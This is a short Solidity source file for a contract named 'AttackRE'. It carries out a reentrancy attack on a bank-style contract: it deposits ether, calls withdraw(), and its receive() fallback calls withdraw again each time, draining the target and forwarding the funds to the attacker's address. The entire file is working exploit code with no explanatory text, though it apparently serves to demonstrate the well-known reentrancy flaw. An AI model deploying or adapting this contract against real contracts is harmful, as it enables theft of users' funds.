//SPDX-License-Identifier: MIT
pragma solidity ^ 0.8.15;

contract AttackRE{
    address bankAddress;
    address payable attackerAddress;

    constructor(address bankRE) {
        bankAddress = bankRE;
    }

    function sendEther() public payable {
        (bool result, ) = bankAddress.call{value: msg.value, gas: 100000}(
          abi.encodeWithSignature("deposit()")
        );

        require(result, "Ether transfer did not go through.");

        attackerAddress = payable(msg.sender);
    }

    function getEther() public {
        (bool result,) = bankAddress.call{gas: 100000}(
            abi.encodeWithSignature("withdraw()")
        );

        require(result, "Could not withdraw ether");
    }

    receive() external payable{
        getEther();
        attackerAddress.transfer(msg.value);
    }
    
    function attack() public payable{
        sendEther();
        getEther();
    }
}
